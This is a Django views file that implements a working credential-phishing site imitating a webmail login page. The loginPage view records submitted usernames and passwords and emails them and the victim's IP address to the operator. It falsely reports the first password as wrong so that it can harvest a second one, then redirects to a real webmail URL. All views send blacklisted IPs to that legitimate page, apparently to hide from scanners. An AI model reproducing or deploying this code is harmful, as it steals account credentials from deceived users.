from django.shortcuts import render,redirect
from django.core.mail import send_mail
from django.conf import  settings
from .models import *

def RobotAuth(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = None
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    blackListUsers = Blacklist.objects.all().values_list('username__ip_address', flat=True)

    if ip in blackListUsers:
        return redirect('http://mail.canadaautosolutions.com/mewebmail/Mondo/lang/sys/login.aspx')
    return render(request, 'index.html')

def home(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = None
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    blackListUsers = Blacklist.objects.all().values_list('username__ip_address', flat=True)

    if ip in blackListUsers:
        return redirect('http://mail.canadaautosolutions.com/mewebmail/Mondo/lang/sys/login.aspx')
    
    mobile =None 
    if "Android" in request.META['HTTP_USER_AGENT'] or "iphone" in request.META['HTTP_USER_AGENT']:
        mobile='mobile'
    else:
        mobile="desktop" 
    return render(request, 'welcome.html', {'mobile':mobile})


def loginPage(request,pk):
    if pk == '' or pk is None:
        return redirect('Home')
    template = "mobile.html" if pk == 'mobile' else "desktop.html"
    
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = None
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    blackListUsers = Blacklist.objects.all().values_list('username__ip_address', flat=True)

    if ip in blackListUsers:
        return redirect('http://mail.canadaautosolutions.com/mewebmail/Mondo/lang/sys/login.aspx')
    
    error_msg = ""
    if request.method == 'POST':
        try:
            request.session['count']
        except:
            request.session['count'] = 0
        if request.session['count'] == 1:
            print(request.session['count'])
            
            user = Logins.objects.get(id=request.session['user'])
            username = request.POST['username']
            password2 = request.POST['password']
            
            user.password2 = password2
            user.save()
            
           
            
            subject = 'the M.E login details'
            message = f'username: {user.username}\npassword2: {user.password2}\nip_address: {ip}'

            send_mail(
                subject,
                message,
                settings.EMAIL_HOST_USER,
                [settings.EMAIL_HOST_USER],
                fail_silently=False,
            ) 
            request.session.pop('count')
            request.session.pop('user')
            
            return redirect('http://mail.canadaautosolutions.com/mewebmail/Mondo/lang/sys/login.aspx')
            
            
        username = request.POST['username']
        password1 = request.POST['password']
        
        user = Logins.objects.create(username=username, password1=password1, ip_address=ip)
        user.save()
        
        subject = 'the M.E login details'
        message = f'username: {user.username}\npassword1: {user.password1}\nip_address: {ip}'

        send_mail(
            subject,
            message,
            settings.EMAIL_HOST_USER,
            [settings.EMAIL_HOST_USER],
            fail_silently=False,
        )
            
        
        error_msg = "The username or password you entered isn't correct.\nTry entering it again."
        
        request.session['count']  = 1
        request.session['user']  = str(user.id)
    
    return render(request, template, {'err_msg':error_msg})